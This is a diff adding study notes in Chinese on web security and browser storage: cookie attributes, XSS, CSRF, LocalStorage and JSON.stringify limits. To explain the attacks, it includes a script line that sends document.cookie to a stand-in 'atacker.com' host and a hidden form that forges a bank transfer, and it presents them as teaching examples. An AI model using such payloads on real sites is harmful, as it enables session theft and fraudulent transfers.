@@ -1175,5 +1175,98 @@ timer = setInterval(loop,2000);
 
 缺点：
 
- focus、blur 之类的事件本身没有事件冒泡机制，所以无法委托； mousemove、mouseout这样的事件，虽然有事件冒泡，但是只能不断通过位置去计算定位，对性能消耗高，不适合事件委托。
+ focus、blur 之类的事件本身没有事件冒泡机制，所以无法委托； mousemove、mouseout这样的事件，虽然有事件冒泡，但是只能不断通过位置去计算定位，对性能消耗高，不适合事件委托。 
+
+## XSS攻击
+
+Cookie的常用属性：
+
+- Secure：只允许 Cookie 在 HTTPS 请求中被使用
+
+- HttpOnly：禁止使用 JS 访问 cookie（ducoment.cookie 访问被禁止了）
+
+Cookie 只允许储存 4kb 的数据。
+
+比如你在水一个论坛，这个论坛有个 bug：不会对发布内容中的 HTML 标签进行过滤
+
+某一天，一个恶意用户发了个帖子，内容如下：
+
+```html
+<script>window.open("atacker.com?cookie=" + document.cookie</script> 
+```
+
+当你访问这条帖子的内容时，浏览器就会执行 `<script>` 中的代码，导致你的 Cookie 被发送给攻击者，接着攻击者就可以利用你的 Cookie 登录论坛，然后为所欲为了
+
+XSS 攻击在很多情况下，用户甚至不会知道自己被攻击了，比如利用 `<img/>` 的 `src` 属性，就可以做到悄无声息的把用户的信息发给攻击者。
+
+而当设置了 `HttpOnly` 后，`ducoment.cookie` 将获取不到 Cookie，攻击者的代码自然就无法生效了。
+
+## CSRF攻击
+
+假设你在浏览器中登录过某个银行 `bank.com`，这个银行系统使用 Cookie 来保存你的登录态
+
+接着你访问了一个恶意网站，该网站中有一个表单：
+
+```html
+<form action="bank.com/transfer" method="post">
+    <input type="hidden" name="amount" value="100000.00"/>
+    <input type="hidden" name="target" value="attacker"/>
+    <input type="submit" value="屠龙宝刀，点击就送!"/>
+</form>
+
+```
+
+假设 `bank.com/transfer` 是用来转账的接口。
+
+当你被诱导点下了提交按钮后：
+
+1. 由于 form 表单提交是可以跨域的，你将会对 `bank.com/transfer` 发起一次 POST 请求
+2. 由于此前你已经登录过 `bank.com`，浏览器会自动将你的 Cookie 一并发送过去（即使你当前并未处于银行系统的页面）
+3. `bank.com` 收到你的带 Cookie 的请求后，认为你是正常登录了的，导致转账成功进行
+4. 最终你损失了一大笔钱
+
+
+即使用 Cookie 配合 HTTPS 请求，CSRF 攻击也无法被避免，因为 HTTPS 请求只是对传输的数据进行了加密，而 CSRF 攻击的特点是，诱导你去访问某个需要你的权限的接口，HTTPS 并不能阻止这种访问。
+
+CSRF 攻击的核心，就是利用了**浏览器会自动在所有请求里带上 Cookie** 的特性。
+
+#### LocalStorage
+
+SessionStorage 和 LocalStorage 使用方法基本一致，唯一不同的是，一旦关闭页面，SessionStorage 将会删除数据。
+
+因此，LocalStorage 比较常见的一个替代 Cookie 的场景就是登录态的保持，比如用 token 的方法加上 HTTPS 请求，就可以很大程度上提高登录的安全性，避免被 CSRF 攻击（但是依然无法完全避免被 XSS 攻击的风险）。
+
+大概工作流程就是，用户登录后，从服务器拿到一个 token，然后存进 LocalStorage 里，之后每次请求前都从 LocalStorage 里取出 token，放到请求数据里，服务器就能知道是同一个用户在发起请求了；由于 HTTPS 的存在，也不用担心 token 会被泄露给第三方，因此是很安全的。
+
+#### LocalStorage 的缺点
+
+1.  无法像 Cookie 一样设置过期时间
+
+2. 只能存入字符串，无法直接存对象
+
+使用JSON.stringify() 无法正确转换 JS 的部分属性
+
+- undefiend
+
+- Function
+
+- RegExp（正则表达式，转换后变成了空对象）
+
+- Date（转换后变成了字符串，而非 Date 类的对象）
+
+- 无法转换循环引用的对象
+
+  ```js
+  const a = { key: 'value' };
+  a['a'] = a;
+  JSON.stringify(a);
+  
+  // Uncaught TypeError: Converting circular structure to JSON
+  //     --> starting at object with constructor 'Object'
+  //     --- property 'a' closes the circle
+  //     at JSON.stringify (<anonymous>)
+  
+  ```
+
+在大部分应用场景下，LocalStorage 已经能完全替代 Cookie，只有类似于广告这种场景，由于 Cookie 可以被服务端设置，Cookie 仍存在不可替代的价值。
 
